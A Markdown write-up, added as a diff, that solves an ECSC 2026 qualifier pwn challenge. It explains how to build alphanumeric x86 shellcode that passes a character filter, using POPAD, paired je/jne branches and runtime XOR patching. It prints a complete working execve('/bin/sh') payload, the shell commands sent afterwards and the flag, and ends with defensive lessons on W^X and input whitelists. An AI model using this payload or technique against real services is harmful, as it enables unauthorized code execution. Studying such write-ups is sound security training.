@@ -1,0 +1,171 @@
+---
+title: "Reto08_SecureAuthVault"
+description: "A 32-bit PIE binary shipped with its own libc.so.6 and ld-linux.so.2, listening on port 20008."
+date: 2026-08-04T12:07:00.000Z
+tags: ["ctf", "pwn", "ecsc26"]
+ctf: "ECSC 2026 Spanish Qualifier (INCIBE)"
+category: "Pwn"
+---
+
+**CTF:** ECSC 2026 Spanish Qualifier (INCIBE)  
+**Category:** Pwn  
+**Difficulty:** 900  
+
+## Challenge
+
+A 32-bit PIE binary shipped with its own `libc.so.6` and `ld-linux.so.2`, listening on port 20008. It maps an RWX page, prints its address, reads a line from stdin, checks it, copies it to that page and jumps to it.
+
+```text
+==================================================
+[SECURE-AUTH-VAULT] Firmware Signature Console
+Status: ONLINE | Verification Level: HARDENED
+==================================================
+Target buffer address: 0x...
+Enter alphanumeric firmware payload:
+```
+
+## Solution
+
+### The filter
+
+The binary is stripped, so I ran it through Ghidra first. The validation is three separate conditions on the input buffer.
+
+Every byte has to be alphanumeric:
+
+```c
+bVar1 = *(byte *)((int)local_40c + iVar3);
+if ((0x19 < (byte)((bVar1 & 0xdf) + 0xbf)) && (9 < (byte)(bVar1 - 0x30))) {
+    __printf_chk(1, "[SECURITY ERROR] Invalid byte 0x%02x at offset %d (only alphanumeric allowed)!\n", ...);
+```
+
+The payload has to be at least 20 bytes (`cmp $0x13,%edi; jle`). And a dword inside the buffer has to match a constant:
+
+```asm
+1237:  83 ff 13                cmp    $0x13,%edi
+123a:  0f 8e ab 00 00 00       jle    12eb
+1240:  81 bd 0c fc ff ff 35    cmpl   $0x7a394135,-0x3f4(%ebp)
+1247:  41 39 7a
+124a:  74 19                   je     1265
+```
+
+`0x7a394135` little-endian is `35 41 39 7a`, which is the ASCII `5A9z`. Deliberately alphanumeric, so the signature does not fight the filter.
+
+I took the offset straight off the compare instruction rather than counting fields. The buffer starts at `-0x404(%ebp)`: the read loop terminates it with `movb $0x0,-0x404(%ebp,%edi,1)` and the filter loop walks it from `lea -0x404(%ebp),%esi`. The compare reads `-0x3f4(%ebp)`. So the signature goes at buffer+16, and nowhere else. The decompiler shows the same gap, a 16-byte `local_40c[4]` immediately followed by the compared `local_3fc`.
+
+### What the CPU hands you
+
+Everything downstream depends on the register state at the jump, so I read that block byte by byte:
+
+```asm
+12a8:  8b 95 f4 fb ff ff       mov    -0x40c(%ebp),%edx
+12ae:  89 d0                   mov    %edx,%eax
+12b0:  31 db                   xor    %ebx,%ebx
+12b2:  31 c9                   xor    %ecx,%ecx
+12b4:  31 d2                   xor    %edx,%edx
+12b6:  31 f6                   xor    %esi,%esi
+12b8:  31 ff                   xor    %edi,%edi
+12ba:  ff e0                   jmp    *%eax
+```
+
+Two gifts in there, and most of the solve falls out of them.
+
+EAX already holds the address of my own code, so there is no GetPC problem. Normally the awkward part of alphanumeric shellcode is finding out where you are: the usual idiom is a `call` to the next instruction followed by a `pop`, and while `pop eax` is `0x58`, the character `X`, `call` is `0xe8` and outside the alphabet. Here the address is handed over.
+
+The page comes from `mmap`, so it is page aligned and `AL` is zero. That makes `xor al, imm8` (opcode `0x34`, the character `4`) an add of any constant below 256 to a base pointer. That single instruction is all the pointer arithmetic I need.
+
+The zeroing of the other five registers turned out not to matter. `POPAD` overwrites EBX, ECX, EDX, ESI and EDI before my code reaches its first patch, and the tail zeroes ECX and EDX again itself, so nothing from that xor chain survives to the syscall.
+
+### The alphanumeric instruction set
+
+The usable opcodes, and the ones I ended up using:
+
+| Byte | Char | Instruction |
+|---|---|---|
+| `30 /r` | `0` | `xor r/m8, r8` |
+| `34 ib` | `4` | `xor al, imm8` |
+| `48` | `H` | `dec eax` |
+| `50`..`57` | `P`..`W` | `push eax` .. `push edi` |
+| `58`, `59`, `5a` | `X`, `Y`, `Z` | `pop eax`, `pop ecx`, `pop edx` |
+| `61` | `a` | `popad` |
+| `6a ib` | `j` | `push imm8` |
+| `74`, `75` | `t`, `u` | `je`, `jne rel8` |
+
+Two gaps drive the design. `pop ebx` is `0x5b`, which is `[`, so there is no alphanumeric way to load EBX directly. And `jmp rel8` is `0xeb`, also non-alphanumeric.
+
+`POPAD` (`0x61`, the letter `a`) solves the first. It consumes eight dwords: it loads EDI, ESI and EBP, throws the fourth away (the saved-ESP image is discarded, ESP just ends up 32 higher), then loads EBX, EDX, ECX and EAX. So if I control the stack I control EBX. I push my `/bin/sh` pointer six times and my patch base twice:
+
+```asm
+34 6E       xor al,0x6e      ; eax = page+110  ("/bin/sh")
+50 x6                        ; -> EAX,ECX,EDX,EBX,(discarded),EBP
+34 45       xor al,0x45      ; 0x6e ^ 0x45 = 0x2b, eax = page+43
+50 50                        ; -> ESI,EDI
+61          popad            ; ebx = page+110, esi = page+43
+```
+
+The second gap I solved with a `je`/`jne` pair. The first four bytes are `74 32 75 30`, which is `t2u0`. `je` from offset 2 lands on 52, `jne` from offset 4 lands on 52. Whichever way ZF happens to fall on entry, one of them is taken, so it is an unconditional jump built out of two conditional ones. It exists to hop over the `5A9z` signature at offset 16 and the filler around it, landing on the real code at 52.
+
+### Patching in the four bytes that cannot be typed
+
+`execve` needs `/bin/sh` and `int 0x80`. That is four bytes I cannot send: two `/` (`0x2f`) and `cd 80`. Since the page is RWX, I store legal stand-ins and XOR them into place at runtime with `xor [esi+disp8], cl` (`30 4e dd`, all three alphanumeric).
+
+| Stored | Key | Result |
+|---|---|---|
+| `Z` (0x5a) | 0x75 | `/` |
+| `Z` (0x5a) | 0x75 | `/` |
+| `y` (0x79) | 0xb4 | `0xcd` |
+| `4` (0x34) | 0xb4 | `0x80` |
+
+Both keys are built out of `push imm8` / `pop eax` / `xor al`:
+
+```asm
+6A 41 58    push 0x41 ; pop eax
+34 34       xor al,0x34      ; 0x41 ^ 0x34 = 0x75
+50 59       push eax ; pop ecx
+
+6A 41 58    push 0x41 ; pop eax
+34 41       xor al,0x41      ; eax = 0
+48          dec eax          ; 0xffffffff, al = 0xff
+34 4B       xor al,0x4b      ; 0xff ^ 0x4b = 0xb4
+50 59       push eax ; pop ecx
+```
+
+I set ESI to `page+43` rather than the page base on purpose, so that every patch displacement stays alphanumeric: `0x43`, `0x47`, `0x41`, `0x42` land on offsets 110, 114, 108 and 109.
+
+### Layout
+
+117 bytes total:
+
+| Offset | Contents | Why |
+|---|---|---|
+| 0-3 | `t2u0` | `je`/`jne`, both to 52 |
+| 4-15 | `A` filler | |
+| 16-19 | `5A9z` | the signature dword |
+| 20-51 | `A` filler | |
+| 52-107 | shellcode | popad setup, patches, execve args |
+| 108-109 | `y4` | becomes `cd 80` |
+| 110-116 | `ZbinZsh` | becomes `/bin/sh` |
+
+Which serializes to a payload that is genuinely just a word:
+
+```text
+t2u0AAAAAAAAAAAA5A9zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4nPPPPPP4EPPajAX44PY0NC0NGjAX4AH4KPY0NA0NBjAX4APYPZjAX4Jy4ZbinZsh
+```
+
+The tail of the code sets up the syscall. EBX already points at the string from `POPAD`, so all that is left is to zero EAX once and push it into ECX and EDX, then `0x41 ^ 0x4a = 0x0b` for `SYS_execve`:
+
+```asm
+6A 41 58 34 41   ; eax = 0
+50 59            ; ecx = 0   (argv)
+50 5A            ; edx = 0   (envp)
+6A 41 58 34 4A   ; eax = 0x0b
+```
+
+I sent it, the console printed `[INFO] Executing authenticated vault firmware...`, and the connection turned into a shell. `id; pwd; ls -la; cat flag* 2>/dev/null; cat /flag* 2>/dev/null` on one line gave up the file.
+
+Flag: `flag{ECSC2026_alpha_opaque_shellcode_production_key}`
+
+## Takeaway
+
+A character-class whitelist is not a sandbox. Restricting input to `[A-Za-z0-9]` feels like it should stop shellcode, and on paper it removes `call`, `jmp rel8`, `int 0x80` and every `/` in a path. In practice the alphanumeric subset of x86 still contains arithmetic, a `push` for every register, a `pop` for EAX, ECX and EDX, `POPAD` for the rest, conditional branches and a store, and that is enough to compute anything, including the bytes you were not allowed to send. Filtering the alphabet constrains the encoding, never the semantics.
+
+The actual bug is one line further up: the page is mapped `PROT_READ|PROT_WRITE|PROT_EXEC` and then jumped into. W^X exists precisely so that a page is never both at once. If a program genuinely has to generate code at runtime, it should `mmap` the page writable, write it, then `mprotect` it to read plus execute before the first jump. That alone kills the self-patching trick here, because the four illegal bytes could never be written after the filter ran. And the input never should have been executed at all: "verify then run attacker bytes" is not a signature check, it is a signature-shaped constant compare, and `5A9z` is not a cryptographic anything. Printing the page address on top of that hands over one more thing, though this payload never needed it: EAX already held the page at the jump.
